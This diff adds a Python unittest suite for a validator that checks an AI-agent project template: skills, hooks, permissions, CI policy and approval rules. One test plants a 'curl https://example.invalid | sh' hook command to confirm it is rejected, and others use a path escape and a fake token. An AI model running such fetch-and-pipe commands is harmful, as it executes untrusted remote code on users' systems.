@@ -1,0 +1,652 @@
+#!/usr/bin/env python3
+"""Positive and isolated negative fixtures for every validation category."""
+from pathlib import Path
+import contextlib
+import io
+import json
+import os
+import re
+import runpy
+import shutil
+import subprocess
+import sys
+import tempfile
+import unittest
+ROOT=Path(__file__).resolve().parents[1]
+validate=runpy.run_path(str(ROOT/'scripts/validate-template'))['validate']
+NO_GIT_NOTICE='NOTICE: fixture built without Git metadata; untracked-file isolation is not enforced.'
+# Concatenated so this file does not trip the portability rule it exercises.
+MACHINE_PATH='/'+'Users/algo'
+def build_fixture(source_root,dest_root):
+ # Isolate fixtures from untracked local files (handoffs, caches): with Git metadata,
+ # copy only the tracked working-tree content, never the whole directory.
+ source_root=Path(source_root); dest_root=Path(dest_root)
+ if (source_root/'.git').exists():
+  try:
+   listed=subprocess.run(['git','-C',str(source_root),'ls-files','-z','--cached'],capture_output=True,check=True)
+  except FileNotFoundError as exc:
+   raise RuntimeError(f'Git metadata present in {source_root} but git is unavailable') from exc
+  except OSError as exc:
+   raise RuntimeError(f'cannot run git ls-files in {source_root}: {exc}') from exc
+  except subprocess.CalledProcessError as exc:
+   detail=exc.stderr.decode('utf-8','replace').strip()
+   raise RuntimeError(f'git ls-files failed in {source_root}: {detail or exc}') from exc
+  dest_root.mkdir(parents=True,exist_ok=True)
+  for rel in listed.stdout.decode('utf-8','surrogateescape').split('\0'):
+   if not rel: continue
+   src=source_root/rel
+   if not src.is_file(): raise RuntimeError(f'tracked file missing from working tree: {rel}')
+   dst=dest_root/rel; dst.parent.mkdir(parents=True,exist_ok=True); shutil.copy2(src,dst)
+ else:
+  shutil.copytree(source_root,dest_root,ignore=shutil.ignore_patterns('.git','__pycache__','artifacts'))
+  print(NO_GIT_NOTICE)
+ return dest_root
+class ValidationTests(unittest.TestCase):
+ def setUp(self):
+  temp=tempfile.TemporaryDirectory(); self.addCleanup(temp.cleanup)
+  self.root=Path(temp.name)/'fixture'
+  build_fixture(ROOT,self.root)
+ def change(self,name,old,new):
+  p=self.root/name; p.write_text(p.read_text().replace(old,new))
+ def assertRule(self,rule): self.assertTrue(any(e.startswith(rule+':') for e in validate(self.root)),rule)
+ def test_valid(self): self.assertEqual(validate(self.root),[])
+ def test_claude_adapter_required(self):
+  (self.root/'.claude/skills/orchestrate/SKILL.md').unlink(); self.assertRule('structure')
+ def test_claude_canonical_bridge(self):
+  self.change('CLAUDE.md','@AGENTS.md','@README.md'); self.assertRule('claude')
+ def test_claude_skill_canonical_path(self):
+  self.change('.claude/skills/orchestrate/SKILL.md','.agents/skills/orchestrate/SKILL.md','README.md'); self.assertRule('claude')
+ def test_agent_eval_fixtures_required(self):
+  (self.root/'evals/scenarios.json').unlink(); self.assertRule('structure')
+ def test_agent_eval_ci_wiring(self):
+  self.change('.github/workflows/check-harness.yml','python3 scripts/eval-agent-behavior --self-test','echo skip-agent-evals'); self.assertRule('agent-evals')
+ def test_structure(self):
+  (self.root/'templates/progress.md').unlink(); self.assertRule('structure')
+ def test_orchestrator_structure(self):
+  (self.root/'.agents/skills/orchestrate/SKILL.md').unlink(); self.assertRule('structure')
+ def test_handoff_skill_required(self):
+  (self.root/'.agents/skills/handoff/SKILL.md').unlink(); self.assertRule('structure')
+ def test_handoff_adapter_required(self):
+  self.change('.claude/skills/handoff/SKILL.md','.agents/skills/handoff/SKILL.md','README.md'); self.assertRule('claude')
+ def test_relay_skill_required(self):
+  (self.root/'.agents/skills/relay/SKILL.md').unlink(); self.assertRule('structure')
+ def test_relay_manifest(self):
+  self.change('.agents/skills/relay/SKILL.md','name: relay','name: wrong'); self.assertRule('manifest')
+ def test_relay_contract_headings(self):
+  self.change('.agents/skills/relay/SKILL.md','## Stop conditions','## End'); self.assertRule('contracts')
+ def test_relay_claude_bridge(self):
+  self.change('.claude/skills/relay/SKILL.md','.agents/skills/relay/SKILL.md','README.md'); self.assertRule('claude')
+ def test_relay_ci_wiring(self):
+  self.change('.github/workflows/check-harness.yml','python3 scripts/test-agent-relay','echo skip-agent-relay'); self.assertRule('ci')
+ def test_handoff_no_auto_resume(self):
+  self.change('.agents/skills/handoff/SKILL.md','NO AUTO-RESUME','AUTO-RESUME'); self.assertRule('handoff')
+ def test_handoff_no_new_development(self):
+  self.change('.agents/skills/handoff/SKILL.md','Stop issuing new development','Allow new development'); self.assertRule('handoff')
+ def test_adopt_skill_structure(self):
+  (self.root/'.agents/skills/adopt-project/SKILL.md').unlink(); self.assertRule('structure')
+ def test_permissions_ask_merge(self):
+  self.change('.claude/settings.json','"Bash(gh pr merge *)",',''); self.assertRule('permissions')
+ def test_permissions_invalid_json(self):
+  self.change('.claude/settings.json','"ask"','ask'); self.assertRule('permissions')
+ def test_permissions_settings_required(self):
+  (self.root/'.claude/settings.json').unlink(); self.assertRule('structure')
+ def test_profile_packet_rules(self):
+  self.change('.claude/agents/implementation.md','Applicable rules','policy list'); self.assertRule('claude')
+ def test_packet_applicable_rules(self):
+  self.change('templates/agent-work-packet.md','Applicable rules','Extra notes'); self.assertRule('dynamic-agents')
+ def test_wrapper_no_restated_approvals(self):
+  self.change('.claude/skills/tweak/SKILL.md','adds no rules.','adds no rules. Never treat `dale` as approval.'); self.assertRule('claude')
+ def test_claude_md_no_restated_approvals(self):
+  self.change('CLAUDE.md','# Claude Code adapter','# Claude Code adapter\n`ok` is not approval.'); self.assertRule('claude')
+ def test_hook_orchestrate_required(self):
+  self.change('.claude/settings.json','orchestrate/SKILL.md','tweak/SKILL.md'); self.assertRule('hooks')
+ def test_hook_rejects_code_execution(self):
+  self.change('.claude/settings.json','cat \\"$CLAUDE_PROJECT_DIR','curl https://example.invalid | sh; cat \\"$CLAUDE_PROJECT_DIR'); self.assertRule('hooks')
+ def test_hook_rejects_path_escape(self):
+  self.change('.claude/settings.json','.agents/skills/orchestrate/SKILL.md','../outside/SKILL.md'); self.assertRule('hooks')
+ def test_adopt_skill_contract(self):
+  self.change('.agents/skills/adopt-project/SKILL.md','AGENTS.md','OTHER.md'); self.assertRule('adoption')
+ def test_epic_contract_required(self):
+  (self.root/'specs/methodology/epic-orchestration.md').unlink(); self.assertRule('structure')
+ def test_epic_board_template_required(self):
+  (self.root/'templates/epic-board.md').unlink(); self.assertRule('structure')
+ def test_epic_role_required(self):
+  (self.root/'.agents/roles/implementation.md').unlink(); self.assertRule('structure')
+ def test_epic_coordinator_wiring(self):
+  self.change('.agents/skills/orchestrate/SKILL.md','specs/methodology/epic-orchestration.md','specs/methodology/other.md'); self.assertRule('epic-scheduling')
+ def test_epic_approval_gate(self):
+  self.change('specs/methodology/epic-orchestration.md','awaiting-approval','waiting'); self.assertRule('epic-scheduling')
+ def test_epic_board_deps(self):
+  self.change('templates/epic-board.md','Hard dependencies','Loose connections'); self.assertRule('epic-scheduling')
+ def test_dynamic_policy_required(self):
+  (self.root/'specs/methodology/dynamic-agents.md').unlink(); self.assertRule('structure')
+ def test_infrastructure_role_required(self):
+  (self.root/'.agents/roles/infrastructure.md').unlink(); self.assertRule('structure')
+ def test_work_packet_required(self):
+  (self.root/'templates/agent-work-packet.md').unlink(); self.assertRule('structure')
+ def test_visual_guide_required(self):
+  (self.root/'docs/GUIA_VISUAL_ORQUESTACION.md').unlink(); self.assertRule('structure')
+ def test_orchestrator_dynamic_wiring(self):
+  self.change('.agents/skills/orchestrate/SKILL.md','specs/methodology/dynamic-agents.md','specs/methodology/other.md'); self.assertRule('dynamic-agents')
+ def test_execution_mode_policy(self):
+  cases=(
+   ('specs/methodology/dynamic-agents.md','## Execution mode: direct, foreground, background'),
+   ('specs/methodology/dynamic-agents.md','**Direct (coordinator).**'),
+   ('specs/methodology/dynamic-agents.md','**Foreground subagent.**'),
+   ('specs/methodology/dynamic-agents.md','**Background subagent.**'),
+   ('specs/methodology/dynamic-agents.md','verified client support'),
+   ('specs/methodology/dynamic-agents.md',"Releasing the coordinator's turn"),
+   ('specs/methodology/dynamic-agents.md','Promise no background persistence'),
+   ('specs/methodology/dynamic-agents.md','Never claim a subagent'),
+   ('.agents/skills/orchestrate/SKILL.md','execution mode adaptively'),
+   ('.agents/skills/orchestrate/SKILL.md','coordinator availability'),
+   ('.agents/skills/orchestrate/SKILL.md','background persistence'),
+  )
+  for name, token in cases:
+   with self.subTest(name=name, token=token):
+    p=self.root/name; original=p.read_text()
+    self.assertIn(token, original)
+    try:
+     p.write_text(original.replace(token, 'REMOVED'))
+     self.assertRule('execution-mode')
+    finally:
+     p.write_text(original)
+ def test_execution_mode_scenarios(self):
+  self.change('evals/scenarios.json','"id": "execution-','"id": "removed-'); self.assertRule('agent-evals')
+ def test_mermaid_validator_script_required(self):
+  (self.root/'scripts/check-mermaid.mjs').unlink(); self.assertRule('structure')
+ def test_mermaid_ci_wiring(self):
+  self.change('.github/workflows/check-harness.yml','node scripts/check-mermaid.mjs','echo skipping-mermaid'); self.assertRule('ci')
+ def test_visual_diagram_count(self):
+  self.change('docs/GUIA_VISUAL_ORQUESTACION.md','```mermaid','```text'); self.assertRule('visual-guide')
+ def test_work_packet_ownership(self):
+  self.change('templates/agent-work-packet.md','Write files','Editable stuff'); self.assertRule('dynamic-agents')
+ def test_model_selection_structure(self):
+  (self.root/'specs/methodology/model-selection.md').unlink(); self.assertRule('structure')
+ def test_model_selection_policy(self):
+  self.change('specs/methodology/model-selection.md','balanced','neutral'); self.assertRule('model-selection')
+ def test_model_selection_wiring(self):
+  self.change('.agents/skills/orchestrate/SKILL.md','specs/methodology/model-selection.md','specs/methodology/other.md'); self.assertRule('model-selection')
+ def test_efficiency_investigation_guard(self):
+  self.change('.agents/skills/orchestrate/SKILL.md','After two comparable attempts','After unlimited attempts'); self.assertRule('orchestration-efficiency')
+ def test_workflow_contract(self):
+  self.change('specs/methodology/workflows.md','Quick','Tiny'); self.assertRule('orchestration')
+ def test_links(self):
+  self.change('README.md','# Mi VPS · Infraestructura','# Mi VPS · Infraestructura\n[Broken](missing.md)'); self.assertRule('links')
+ def test_agents(self):
+  self.change('AGENTS.md','(specs/guidelines/ui.md)','(README.md)'); self.assertRule('agents')
+ def test_thin_agents(self):
+  self.change('AGENTS.md','# AGENTS.md · Mi VPS / Infraestructura','# AGENTS.md · Mi VPS / Infraestructura'+'\n'*70); self.assertRule('agents')
+ def test_manifest(self):
+  self.change('.agents/skills/spec/SKILL.md','name: spec','name: wrong'); self.assertRule('manifest')
+ def test_empty_description(self):
+  p=self.root/'.agents/skills/spec/SKILL.md'; p.write_text('\n'.join('description: ' if l.startswith('description:') else l for l in p.read_text().split('\n'))); self.assertRule('manifest')
+ def test_contracts(self):
+  self.change('.agents/skills/dev/SKILL.md','## Stop conditions','## End'); self.assertRule('contracts')
+ def test_resume(self):
+  self.change('.agents/skills/init-project/SKILL.md','specs/setup-progress.md','specs/other.md'); self.assertRule('resume')
+ def test_stage(self):
+  self.change('.agents/skills/init-project/SKILL.md','### Stage 5 —','### Other —'); self.assertRule('resume')
+ def test_secrets(self):
+  self.change('README.md','# Mi VPS · Infraestructura','# Mi VPS · Infraestructura\n'+'gh'+'p_'+'a'*36); self.assertRule('secrets')
+ def test_portability(self):
+  self.change('README.md','# Mi VPS · Infraestructura','# Mi VPS · Infraestructura\n'+'/'+'home/example/project'); self.assertRule('portability')
+ def test_neutrality(self):
+  self.change('AGENTS.md','# AGENTS.md · Mi VPS / Infraestructura','# AGENTS.md · Mi VPS / Infraestructura\nAll projects must use ExampleStack.'); self.assertRule('neutrality')
+ def test_ci_policy_required(self):
+  (self.root/'specs/methodology/ci-policy.md').unlink(); self.assertRule('structure')
+ def test_ci_policy_contract(self):
+  for token in ('documentation Markdown', 'classification errors default to `full`',
+                'Documentation and security controls are mandatory',
+                'structure and execution conditions', 'unexpected skipped checks',
+                'continue-on-error', 'Preserve approved security controls'):
+   with self.subTest(token=token):
+    p=self.root/'specs/methodology/ci-policy.md'; original=p.read_text()
+    p.write_text(original.replace(token, 'REMOVED'))
+    self.assertRule('ci-policy'); p.write_text(original)
+ def test_ci_profiles_and_postmerge_contract(self):
+  for token in ('execution-profile matrix', 'bounded timeout',
+                'Reducing automatic',
+                'The PR gate validated the exact integration tree against the current base.',
+                'Branch protection requires that gate and prevents stale, bypassed or force-pushed',
+                'Tree equivalence between the tested PR integration and the merged commit is',
+                'If any guarantee is absent, stale or unverified',
+                "retain the project's existing",
+                'do not automatically reduce critical or full checks',
+                'does not attest local QA', 'A PR can modify its own workflow',
+                'Require explicit review of CI', 'rerun the affected critical checks'):
+   with self.subTest(token=token):
+    p=self.root/'specs/methodology/ci-policy.md'; original=p.read_text()
+    try:
+     p.write_text(original.replace(token, 'REMOVED'))
+     self.assertRule('ci-policy')
+    finally:
+     p.write_text(original)
+ def test_adopt_project_ci_assessment(self):
+  for token in ('CI contract', 'required check', 'branch protection',
+                'check identity', 'do not substitute'):
+   with self.subTest(token=token):
+    p=self.root/'.agents/skills/adopt-project/SKILL.md'; original=p.read_text()
+    try:
+     p.write_text(original.replace(token, 'REMOVED'))
+     self.assertRule('adoption')
+    finally:
+     p.write_text(original)
+ def test_product_document_policy_regressions(self):
+  # Structural preservation guards; generated harnesses test real Git behavior.
+  mutations = (
+   ('Markdown protection', 'Markdown extension alone is insufficient'),
+   ('protected precedence', 'Protected exclusions take precedence'),
+   ('policy changes', 'Changes to the protected-path policy or classifier themselves require `full`'),
+   ('add modify delete', 'additions, modifications and deletions'),
+   ('rename endpoints', 'both rename directions checked'),
+   ('mixed protected files', 'alone and mixed with documentation Markdown'),
+   ('adaptable paths', 'document Markdown in different directories'),
+   ('existing project', 'without init-project'),
+  )
+  p=self.root/'specs/methodology/ci-policy.md'; original=p.read_text()
+  for case, token in mutations:
+   with self.subTest(case=case):
+    self.assertIn(token, original)
+    try:
+     p.write_text(original.replace(token, 'REMOVED'))
+     self.assertRule('ci-policy')
+    finally:
+     p.write_text(original)
+ def test_quality_product_docs_policy(self):
+  self.change('specs/guidelines/quality.md', 'A Markdown extension alone is insufficient', 'Extension is enough')
+  self.assertRule('ci-policy')
+ def test_bootstrap_ci_policy(self):
+  self.change('.agents/skills/bootstrap/SKILL.md','Prove the contract locally','Skip contract verification')
+  self.assertRule('ci-policy')
+ def test_quality_ci_policy(self):
+  self.change('specs/guidelines/quality.md','actual classifier and workflow behavior','command presence')
+  self.assertRule('ci-policy')
+ def test_verification_entry_contract(self):
+  # Each guard protects an obligation, not generated command behavior.
+  cases = {
+   'specs/methodology/ci-policy.md': (
+    '## Canonical verification entry point', 'Reuse an existing command',
+    'a way to force', 'same check selection', 'each required suite once',
+    'nonzero exit status', 'missing prerequisite', 'invalid mode',
+    'unexpectedly zero discovered tests', 'intentionally omitted',
+    'must not install dependencies', 'invoke the real entry point',
+    'local/CI selection parity', 'without a second'),
+   '.agents/skills/bootstrap/SKILL.md': (
+    'one canonical verification command', 'Reuse an adequate existing command'),
+   'specs/guidelines/quality.md': (
+    'one canonical verification command', 'reusing an adequate existing',
+    'forced full mode'),
+  }
+  for name, tokens in cases.items():
+   p=self.root/name; original=p.read_text()
+   for token in tokens:
+    with self.subTest(name=name, token=token):
+     self.assertIn(token, original)
+     try:
+      p.write_text(original.replace(token, 'REMOVED'))
+      self.assertRule('verification-entry')
+     finally:
+      p.write_text(original)
+ def test_usage_report_files_required(self):
+  for name in ('scripts/report-agent-usage', 'scripts/test-agent-usage', 'docs/USAGE_REPORTS.md'):
+   with self.subTest(name=name):
+    p=self.root/name; original=p.read_bytes()
+    p.unlink()
+    try:
+     self.assertRule('structure')
+    finally:
+     p.write_bytes(original)
+ def test_usage_report_ci_wiring(self):
+  self.change('.github/workflows/check-harness.yml','python3 scripts/test-agent-usage','echo skip-usage-tests')
+  self.assertRule('ci')
+ def test_auto_usage_report_files_required(self):
+  for name in ('scripts/auto-agent-usage', 'scripts/test-auto-agent-usage', '.codex/hooks.json'):
+   with self.subTest(name=name):
+    p=self.root/name; original=p.read_bytes()
+    p.unlink()
+    try:
+     self.assertRule('structure')
+    finally:
+     p.write_bytes(original)
+ def test_auto_usage_report_ci_wiring(self):
+  self.change('.github/workflows/check-harness.yml','python3 scripts/test-auto-agent-usage','echo skip-auto-tests')
+  self.assertRule('ci')
+ def test_auto_usage_hook_scope_and_command(self):
+  for old,new in (('SubagentStop','PreToolUse'), ('auto-agent-usage','other-command'), ('"timeout": 3','"timeout": 600')):
+   with self.subTest(old=old):
+    p=self.root/'.codex/hooks.json'; original=p.read_text()
+    try:
+     self.change('.codex/hooks.json',old,new)
+     self.assertRule('usage-hooks')
+    finally:
+     p.write_text(original)
+ def test_coordination_obligations(self):
+  # Structural drift guards only, not a claim that real clients followed the rules.
+  cases = (
+   ('specs/methodology/dynamic-agents.md', 'scope-sized preflight'),
+   ('specs/methodology/dynamic-agents.md', 'suspending escalation, the worker notifies the coordinator'),
+   ('specs/methodology/dynamic-agents.md', 'Advance notice is not another user approval gate'),
+   ('specs/methodology/dynamic-agents.md', 'fresh bounded context by default'),
+   ('specs/methodology/dynamic-agents.md', 'not repeated status reminders'),
+   ('specs/methodology/dynamic-agents.md', 'QA independently'),
+   ('specs/methodology/dynamic-agents.md', 'No OpenCode adapter is supplied'),
+   ('specs/methodology/dynamic-agents.md', 'explicit user authorization and supported tools'),
+   ('specs/methodology/dynamic-agents.md', 'separate checkouts/worktrees AND non-overlapping ownership'),
+   ('specs/methodology/dynamic-agents.md', 'Separate test ports, databases'),
+   ('specs/methodology/dynamic-agents.md', 'other-client usage is'),
+   ('specs/methodology/dynamic-agents.md', 'Replace stale current-state labels'),
+   ('specs/methodology/dynamic-agents.md', 'savings still need measurement'),
+   ('templates/agent-work-packet.md', 'Client / version / session ID'),
+   ('templates/agent-work-packet.md', 'Blocking notice'),
+   ('templates/progress.md', 'Current checkpoint'),
+   ('templates/testplan.md', 'Local / CI platform and owner'),
+   ('.agents/skills/orchestrate/SKILL.md', 'progressively spaced CI queries'),
+   ('.agents/skills/dev/SKILL.md', 'negative/integration cases before code'),
+   ('.agents/skills/task/SKILL.md', 'execution platform and operation owners before code'),
+   ('.agents/skills/handoff/SKILL.md', 'external client'),
+  )
+  for name,token in cases:
+   with self.subTest(name=name,token=token):
+    p=self.root/name; original=p.read_text()
+    self.assertIn(token,original)
+    try:
+     p.write_text(original.replace(token,'REMOVED'))
+     self.assertRule('coordination')
+    finally:
+     p.write_text(original)
+ def test_resource_policy_guards(self):
+  cases = (
+   ('specs/methodology/model-selection.md', '`gpt-6.1-sol` + `low`'),
+   ('specs/methodology/model-selection.md', 'do not spawn'),
+   ('specs/methodology/model-selection.md', 'requested versus observed'),
+   ('specs/methodology/dynamic-agents.md', '**25% or less:**'),
+   ('specs/methodology/dynamic-agents.md', '**5% or less:**'),
+   ('specs/methodology/dynamic-agents.md', '**including QA**'),
+   ('specs/methodology/dynamic-agents.md', 'after this warning'),
+   ('specs/methodology/dynamic-agents.md', 'OpenCode is not enabled'),
+   ('templates/agent-work-packet.md', 'HANDOFF → CODEX'),
+   ('.agents/skills/orchestrate/SKILL.md', 'run `$handoff`'),
+   ('.agents/skills/handoff/SKILL.md', 'Reread the written checkpoint'),
+  )
+  for name,token in cases:
+   with self.subTest(name=name,token=token):
+    p=self.root/name; original=p.read_text()
+    try:
+     p.write_text(original.replace(token,'REMOVED'))
+     self.assertRule('resource-policy')
+    finally:
+     p.write_text(original)
+ def test_communication_contract_required(self):
+  (self.root/'specs/methodology/coordinator-communication.md').unlink(); self.assertRule('structure')
+ def test_copyable_packet_shared_resources(self):
+  self.change('templates/agent-work-packet.md','Shared test resources: <separate ports, databases and temporary directories','Shared test resources: <unspecified'); self.assertRule('communication')
+ def test_communication_unverified_is_not_failed(self):
+  self.change('specs/methodology/coordinator-communication.md','Missing evidence alone proves neither failure nor non-execution.','Missing evidence means FAIL.'); self.assertRule('communication')
+ def test_communication_states_required(self):
+  self.change('specs/methodology/coordinator-communication.md','ESPERANDO RETORNO','ESPERANDO'); self.assertRule('communication')
+ def test_communication_return_fields_required(self):
+  self.change('templates/agent-work-packet.md','Decisions needed','Open questions'); self.assertRule('communication')
+ def test_communication_orchestrator_link(self):
+  self.change('.agents/skills/orchestrate/SKILL.md','coordinator-communication.md','other.md'); self.assertRule('communication')
+ def test_communication_agents_link(self):
+  self.change('AGENTS.md','(specs/methodology/coordinator-communication.md)','(README.md)'); self.assertRule('communication')
+ def test_communication_criteria_fixtures(self):
+  self.change('evals/scenarios.json','"id": "comms-','"id": "removed-'); self.assertRule('agent-evals')
+ def test_delivery_evidence_contract(self):
+  cases = (
+   ('.agents/skills/orchestrate/SKILL.md', 'delivery-evidence-at-closure'),
+   ('.agents/skills/orchestrate/SKILL.md', 'scope conformance and deviations'),
+   ('.agents/skills/orchestrate/SKILL.md', 'verified effective identity'),
+   ('.agents/skills/orchestrate/SKILL.md', 'create no extra report'),
+   ('specs/methodology/dynamic-agents.md', '## Delivery evidence at closure'),
+   ('specs/methodology/dynamic-agents.md', 'PASS / FAIL / UNRUN'),
+   ('specs/methodology/dynamic-agents.md', 'pending regression'),
+   ('specs/methodology/dynamic-agents.md', "author's reported result"),
+   ('specs/methodology/dynamic-agents.md', 'independent check actually performed'),
+   ('specs/methodology/dynamic-agents.md', 'cause that remains a hypothesis'),
+   ('specs/methodology/dynamic-agents.md', 'self-declaration'),
+   ('docs/AGENT_EVALS.md', 'evidence-01..08'),
+   ('docs/AGENT_EVALS.md', 'semantic completeness'),
+  )
+  for name, token in cases:
+   with self.subTest(name=name, token=token):
+    p=self.root/name; original=p.read_text()
+    self.assertIn(token, original)
+    try:
+     p.write_text(original.replace(token, 'REMOVED'))
+     self.assertRule('delivery-evidence')
+    finally:
+     p.write_text(original)
+ def test_delivery_evidence_scenarios(self):
+  self.change('evals/scenarios.json','"id": "evidence-','"id": "removed-'); self.assertRule('agent-evals')
+ def test_external_contract_does_not_register_clients(self):
+  p=self.root/'specs/methodology/dynamic-agents.md'
+  p.write_text(p.read_text()+'\nAn additional user-selected client may use the same verified packet.\n')
+  self.assertEqual(validate(self.root),[])
+ def test_ci(self):
+  self.change('.github/workflows/check-harness.yml','./scripts/test-validator','echo skip'); self.assertRule('ci')
+ def test_ci_allowed_failure_rejected(self):
+  self.change('.github/workflows/check-harness.yml','      - run: python3 scripts/check_harness.py','      - run: python3 scripts/check_harness.py\n        continue-on-error: true'); self.assertRule('ci')
+ def test_ci_duplicate_command_rejected(self):
+  p=self.root/'.github/workflows/check-harness.yml'
+  p.write_text(p.read_text().replace('      - run: ./scripts/validate-template','      - run: ./scripts/validate-template\n      - run: ./scripts/validate-template')); self.assertRule('ci')
+ def test_local_first_evidence_contract(self):
+  p=self.root/'specs/methodology/ci-policy.md'; original=p.read_text()
+  for token in ('local-first QA','current base commit','reachable raw logs','A PASS declared by an agent','blocks integration','Codex and Claude Code','one unconditional `required` job'):
+   with self.subTest(token=token):
+    try:
+     p.write_text(original.replace(token,'REMOVED')); self.assertRule('ci-policy')
+    finally: p.write_text(original)
+ def test_legitimate_project(self):
+  self.change('specs/guidelines/architecture.md','# Architecture','# Architecture\nApproved for this project: Rust and SQLite.')
+  self.change('README.md','# Universal','# Universal\n[Folder](templates) [External](https://example.com)\nUNDECIDED api_key: YOUR_KEY')
+  self.assertEqual(validate(self.root),[])
+ def test_cli_exit_status(self):
+  command=[sys.executable,str(ROOT/'scripts/validate-template'),str(self.root)]
+  self.assertEqual(subprocess.run(command,capture_output=True).returncode,0)
+  (self.root/'README.md').unlink()
+  self.assertEqual(subprocess.run(command,capture_output=True).returncode,1)
+ def test_nonvisual(self):
+  (self.root/'specs/guidelines/ui.md').write_text('# UI\nNot applicable: CLI project.\n'); self.assertEqual(validate(self.root),[])
+ def test_approval_policy_required(self):
+  (self.root/'specs/methodology/approvals.md').unlink(); self.assertRule('structure')
+ def test_consistency_quick_intent(self):
+  self.change('.agents/skills/tweak/SKILL.md','user clearly requested','agent proposed'); self.assertRule('consistency')
+ def test_consistency_checkpoint_lookup(self):
+  self.change('.agents/skills/orchestrate/SKILL.md','specs/session-handoff.md','specs/other.md'); self.assertRule('consistency')
+ def test_consistency_worktree_consent(self):
+  self.change('specs/methodology/approvals.md','A Work Packet assigns responsibilities','A Work Packet grants scope'); self.assertRule('consistency')
+ def test_consistency_project_precedence(self):
+  self.change('AGENTS.md','Project-specific restrictions','Generic suggestions'); self.assertRule('consistency')
+ def test_worktree_policy_conditions(self):
+  for token in ('work already authorized by the user', 'provides useful isolation', 'does not affect existing work', 'including uncommitted/untracked changes', 'publication or merges', 'never remove a worktree with pending work without user authorization', 'Stricter derived-project restrictions always take precedence'):
+   with self.subTest(token=token):
+    p=self.root/'specs/methodology/approvals.md'; original=p.read_text()
+    p.write_text(original.replace(token,'REMOVED')); self.assertRule('consistency'); p.write_text(original)
+ def test_worktree_policy_references(self):
+  for name in ('AGENTS.md', '.agents/skills/orchestrate/SKILL.md', '.agents/skills/init-project/SKILL.md', 'specs/methodology/dynamic-agents.md'):
+   with self.subTest(name=name):
+    p=self.root/name; original=p.read_text()
+    p.write_text(original.replace('approvals.md#local-worktrees','approvals.md')); self.assertRule('consistency'); p.write_text(original)
+ def test_publication_policy_contract(self):
+  cases = (
+   '## Branch and PR publication', 'No separate publication approval is needed',
+   'local only', 'draft PR', 'Before pushing, review the diff',
+   'An open PR does', 'Creating or merging a specification PR neither approves its content',
+   'explicit, identifiable approval for that PR',
+   'Never enable auto-merge', 'creating repositories',
+   'handoff workflow keeps its own prohibition',
+  )
+  p=self.root/'specs/methodology/approvals.md'; original=p.read_text()
+  for token in cases:
+   with self.subTest(token=token):
+    self.assertIn(token, original)
+    try:
+     p.write_text(original.replace(token, 'REMOVED'))
+     self.assertRule('publication')
+    finally:
+     p.write_text(original)
+ def test_publication_policy_links(self):
+  for name in ('AGENTS.md', '.agents/skills/dev/SKILL.md', '.agents/skills/tweak/SKILL.md',
+               '.agents/skills/task/SKILL.md', 'specs/methodology/workflows.md',
+               'specs/methodology/dynamic-agents.md', 'specs/guidelines/security.md'):
+   with self.subTest(name=name):
+    p=self.root/name; original=p.read_text()
+    self.assertIn('approvals.md#branch-and-pr-publication', original)
+    try:
+     p.write_text(original.replace('approvals.md#branch-and-pr-publication', 'approvals.md'))
+     self.assertRule('publication')
+    finally:
+     p.write_text(original)
+ def test_publication_related_contracts(self):
+  cases = (
+   ('specs/methodology/epic-orchestration.md', 'merge remains a separate approval'),
+   ('templates/agent-work-packet.md', 'authorized scope includes publication'),
+   ('templates/epic-board.md', 'published/updated within the authorized scope'),
+   ('specs/methodology/acceptance-scenarios.md', 'within the authorized scope'),
+   ('docs/GUIA_VISUAL_ORQUESTACION.md', 'PR publicada'),
+  )
+  for name, token in cases:
+   with self.subTest(name=name, token=token):
+    p=self.root/name; original=p.read_text()
+    self.assertIn(token, original)
+    try:
+     p.write_text(original.replace(token, 'REMOVED'))
+     self.assertRule('publication')
+    finally:
+     p.write_text(original)
+ def test_execution_continuity_contract(self):
+  cases = (
+   '## Execution continuity', 'a partial result', 'authorized, executable work remains',
+   'completed work with its evidence', 'decision or approval that only the user can provide',
+   'user request to stop', 'blocker that cannot be resolved',
+   'corrected inside the authorized scope', 'rerun the affected verification',
+   'next action in the same turn', 'Reuse a valid authorization',
+  )
+  p=self.root/'.agents/skills/orchestrate/SKILL.md'; original=p.read_text()
+  for token in cases:
+   with self.subTest(token=token):
+    self.assertIn(token, original)
+    try:
+     p.write_text(original.replace(token, 'REMOVED'))
+     self.assertRule('continuity')
+    finally:
+     p.write_text(original)
+ def test_task_correctable_failure(self):
+  p=self.root/'.agents/skills/task/SKILL.md'; original=p.read_text()
+  for token in ('failed mandatory acceptance checks that cannot be corrected inside the authorized scope',
+                'rerun the affected verification'):
+   with self.subTest(token=token):
+    self.assertIn(token, original)
+    try:
+     p.write_text(original.replace(token, 'REMOVED'))
+     self.assertRule('continuity')
+    finally:
+     p.write_text(original)
+ def test_closure_contract(self):
+  cases = (
+   '## 7. Closing a turn or stopping', 'Whether to yield the turn is defined in',
+   'This section defines only the communication contract',
+   '**Human action:**', '**Exact request:**', '**State:**',
+   'Avoid ambiguous closings', 'whether the agent waits',
+   'When no action is needed', 'manual relays keep their identity',
+  )
+  p=self.root/'specs/methodology/coordinator-communication.md'; original=p.read_text()
+  for token in cases:
+   with self.subTest(token=token):
+    self.assertIn(token, original)
+    try:
+     p.write_text(original.replace(token, 'REMOVED'))
+     self.assertRule('continuity')
+    finally:
+     p.write_text(original)
+ def test_publication_scenarios(self):
+  self.change('evals/scenarios.json', '"id": "publication-', '"id": "removed-')
+  self.assertRule('agent-evals')
+ def test_continuity_scenarios(self):
+  self.change('evals/scenarios.json', '"id": "continuity-', '"id": "removed-')
+  self.assertRule('agent-evals')
+ def test_closure_criteria(self):
+  p=self.root/'evals/scenarios.json'; data=json.loads(p.read_text())
+  case=next(c for c in data['cases'] if c['id']=='closure-01')
+  case['expected'].pop('criteria')
+  p.write_text(json.dumps(data))
+  self.assertRule('agent-evals')
+ def test_eval_docs_match_fixtures(self):
+  p=self.root/'docs/AGENT_EVALS.md'; original=p.read_text()
+  for token in ('publication-01..10', 'continuity-01..07', 'closure-01..03',
+                'does not prove that a real client'):
+   with self.subTest(token=token):
+    self.assertIn(token, original)
+    try:
+     p.write_text(original.replace(token, 'REMOVED'))
+     self.assertRule('agent-evals')
+    finally:
+     p.write_text(original)
+class FixtureIsolationTests(unittest.TestCase):
+ def setUp(self):
+  temp=tempfile.TemporaryDirectory(); self.addCleanup(temp.cleanup)
+  self.tmp=Path(temp.name)
+ def git(self,root,*args):
+  subprocess.run(['git','-c','user.name=Test','-c','user.email=test@example.invalid','-C',str(root),*args],check=True,capture_output=True)
+ def repository(self,name='source'):
+  root=self.tmp/name; root.mkdir(); self.git(root,'init','-q'); return root
